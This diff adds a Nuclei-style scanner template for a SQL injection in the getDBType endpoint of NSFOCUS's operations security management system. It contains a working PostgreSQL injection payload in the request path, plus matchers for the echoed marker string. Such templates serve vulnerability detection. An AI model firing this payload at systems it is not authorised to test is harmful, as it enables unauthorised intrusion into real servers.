@@ -1,0 +1,35 @@
+id: poc-yaml-nsfocus-osms-getdbtype-sqli
+
+info:
+  name: 绿盟运维安全管理系统 getDBType SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in 绿盟运维安全管理系统 through the getDBType endpoint.
+
+http:
+  - method: GET
+    path:
+      - "/webconf/log/getDBType?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&sql=(SELECT+(CHR(113)%7C%7CCHR(122)%7C%7CCHR(122)%7C%7CCHR(107)%7C%7CCHR(113))%7C%7C(SELECT+(CASE+WHEN+(3788%3D3788)+THEN+1+ELSE+0+END))%3A%3Atext%7C%7C(CHR(113)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(113)))"
+    headers:
+      User-Agent: Nuclei-SQLI-Scanner
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<dbtype>qzzkq1qppqqppqq</dbtype>"
+          - "?xml"
+        condition: and
+      - type: word
+        words:
+          - "Server: NSFOCUS"
+        part: header
+      - type: word
+        words:
+          - "<html"
+        part: body
+        negative: true
